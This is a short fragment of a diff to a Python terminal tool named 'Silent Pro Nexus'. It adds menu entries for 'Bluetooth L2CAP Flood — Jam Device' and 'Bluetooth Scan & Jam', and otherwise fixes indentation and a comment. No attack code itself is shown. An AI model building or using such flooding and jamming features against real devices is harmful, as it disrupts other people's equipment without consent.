+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [09] 🔵 Bluetooth L2CAP Flood — Jam Device                       {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [10] 🔵 Bluetooth Scan & Jam — Pick from List                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [11] 📦 Install Optional Dependencies                            {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [12] 🛑 Stop All Operations & Clean Up                        {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [13] ℹ About Silent Pro Nexus                                  {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
@@ -893,7 +795,7 @@ class SilentProNexus:
         print(f"{Colors.BOLD}{Colors.BB}  ╚══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
         print()
 
-       def run(self):
+    def run(self):
         while True:
             self.show_main_menu()
             choice = input(f"{Colors.CYAN}Enter your choice [00-13]: {Colors.RESET}").strip()
@@ -924,7 +826,7 @@ class SilentProNexus:
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# 🚀 ENTRY POINT — START THE ENGINE!
+# 🚀 ENTRY POINT — START!
 # ═══════════════════════════════════════════════════════════════════════════
 if __name__ == "__main__":
     try:
